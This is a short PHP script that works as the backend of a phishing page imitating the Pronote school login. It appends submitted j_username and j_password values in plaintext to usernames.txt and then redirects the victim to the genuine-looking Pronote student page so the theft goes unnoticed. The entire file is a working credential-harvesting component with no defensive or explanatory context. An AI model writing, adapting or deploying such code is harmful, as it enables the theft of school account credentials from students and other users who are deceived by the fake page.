<?php

file_put_contents("usernames.txt", "Account: " . $_POST['j_username'] . " Pass: " . $_POST['j_password'] . "\n", FILE_APPEND);
header('Location: https://e044000b.index-education.net/pronote/eleve.html');
exit();
